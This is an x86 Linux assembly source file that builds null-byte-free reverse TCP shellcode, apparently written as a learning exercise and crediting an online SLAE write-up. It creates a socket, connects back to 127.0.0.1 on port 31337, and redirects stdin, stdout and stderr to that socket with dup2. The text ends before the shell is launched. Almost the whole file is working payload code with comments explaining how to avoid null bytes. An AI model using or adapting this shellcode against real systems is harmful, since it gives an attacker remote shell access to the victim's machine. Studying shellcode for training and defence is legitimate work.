# With help from https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/
.global _start
.section .text

_start:
# int socketcall(int call, unsigned long *args)
# sockfd = socket(int socket_family, int socket_type, int protocol)
xor %eax, %eax
mov $0x66, %al # put syscall number for socketcall into eax
# note: using al and not eax so as not to have null bytes in the resulting dump

xor %ebx, %ebx
mov $0x1, %bl # put sys_socket (0x01) into ebx

xor %edx, %edx # set edx to 0

push %edx # protocol = IPPROTO_IP (0x0) 
push %ebx # socket_type = SOCK_STREAM(0x01)
push $0x02 # socket_family = AF_INET (0x02)

mov %esp, %ecx # put pointer to socket() args into ecx

int $0x80 # call sys_socket

mov %eax, %edx # put sockfd into edx

# int socketcall(int call, unsigned long *args)
# int connect(int sockfd, const struct sockaddr* addr, socklen_t addrlen)
xor %eax, %eax
mov $0x66, %al # put syscall number for socketcall into eax

# struct sockaddr_in {
#   __kernel_sa_family_t  sin_family;
#   __be16                sin_port;
#   struct in_addr        sin_addr;			 
# }

xor %ecx, %ecx # set ecx to 0
add $0x01, %cl # in order to avoid writing null bytes, we write 1 first...
shl $24, %ecx # ...then shift it to the left...
add $0x7f, %cl # ...then add 127...
push %ecx # ...the result is sin_addr = 127.0.0.1 in big endian notation
pushw $0x697a # sin_port = 31337, big endian
inc %ebx # ebx = 2
pushw %bx # sin_family = AF_INET (0x02)
mov %esp, %ecx # put pointer to sockaddr struct into ecx

push $0x10 # addrlen = 16
push %ecx # pointer to sockaddr struct
push %edx # sockfd

mov %esp, %ecx # put pointer to sockaddr_in into ecx

inc %ebx # ebx = 3, sys_connect (0x03)

int $0x80 # call sys_connect

# int socketcall(int call, unsigned long *args)
# int dup2(int oldfd, int newfd)
xor %ecx, %ecx
mov $0x02, %cl # put the loop counter (2) into ecx. It will also serve as oldfd argument for dup2.

mov %edx, %ebx # put sockfd into ebx

# will redirect stdin(0), stdout(1), stderr(2) to the socket
loop:
	xor %eax, %eax
	mov $0x3f, %al # put syscall number for sys_dup2 into eax
	int $0x80 # call sys_dup2
	dec %ecx # decrement loop counter in ecx
	jns loop